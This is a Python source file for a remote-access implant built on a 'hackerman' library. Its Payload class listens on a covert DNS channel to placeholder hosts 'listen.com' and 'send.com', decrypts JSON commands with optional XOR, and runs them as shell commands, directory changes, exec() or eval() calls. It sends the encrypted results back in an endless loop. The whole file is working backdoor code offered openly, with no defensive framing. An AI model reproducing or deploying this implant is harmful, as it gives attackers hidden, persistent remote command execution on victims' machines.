from hackerman.transport.covert import dns
from hackerman.crypto import xor
from hackerman import utils
import json

class NoCrypt(object):
	def encrypt(self, raw):
		return raw
	def decrypt(self, raw):
		return raw
class XORCrypt(object):
	def __init__(self, password):
		self.pwd = password
	def encrypt(self, raw):
		return xor.encrypt(raw, self.pwd)
	def decrypt(self, raw):
		return xor.decrypt(raw, self.pwd)

class Payload(object):
	def __init__(self, crypt, send="listen.com", listen="send.com"):
		self.encrypt = crypt.encrypt
		self.decrypt = crypt.decrypt
		self.client = dns.SpeedyClient(send=send, listen=listen)
	def do_cmd(self, cmd):
		if cmd['type'] == "sh":
			res = utils.sh(cmd['cmd'])
			return utils.b64e(res)
		elif cmd['type'] == "cd":
			res = utils.cd(cmd['dir'])
			return res
		elif cmd['type'] == "exec":
			exec(cmd['code'])
			return None
		elif cmd['type'] == "eval":
			res = eval(cmd['code'])
			return res
		else:
			return False
	def run(self):
		while True:
			try:
				recv = self.client.recv()
				dec = self.decrypt(recv)
				cmd = json.loads(dec)
				res = {'res':self.do_cmd(cmd)}
				enc = self.encrypt(json.dumps(res).encode())
				self.client.send(enc)
			except Exception as e:
				print("[ERROR]: ",str(e))